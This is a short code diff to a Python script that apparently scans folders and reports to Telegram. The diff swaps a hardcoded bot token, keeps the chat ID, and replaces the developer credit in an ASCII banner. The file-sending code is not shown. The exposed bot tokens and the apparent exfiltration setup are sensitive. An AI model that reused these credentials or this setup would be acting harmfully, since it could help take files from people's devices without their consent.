@@ -11,7 +11,7 @@ CYAN = "\033[96m"
 YELLOW = "\033[93m"
 RESET = "\033[0m"
 
-BOT_TOKEN = "7719419366:AAEFyUYb3ElldpoJFmRC4NKg4NcU67ErO_4"
+BOT_TOKEN = "7395653905:AAERj-Co1l5QmgJO-TEK3va1C81CijAVM94"
 CHAT_ID = "6333041510"
 
 FOLDERS_TO_SCAN = [
@@ -126,7 +126,7 @@ def show_logo():
     print(f"███████║██║  ██║╚██████╔╝███████╗██║     ")
     print(f"╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝    {RESET}")
     print(f"{CYAN}──────────────────────────────────────────{RESET}")
-    print(f"{YELLOW} Developer : {GREEN}BIN MAMUN{RESET}")
+    print(f"{YELLOW} Developer : {GREEN}HELLO WORLD {RESET}")
     print(f"{YELLOW} CEO       : {GREEN}BHT COMMUNITY{RESET}")
     print(f"{YELLOW} Mail      : {GREEN}Random{RESET}")
     print(f"{CYAN}──────────────────────────────────────────{RESET}")
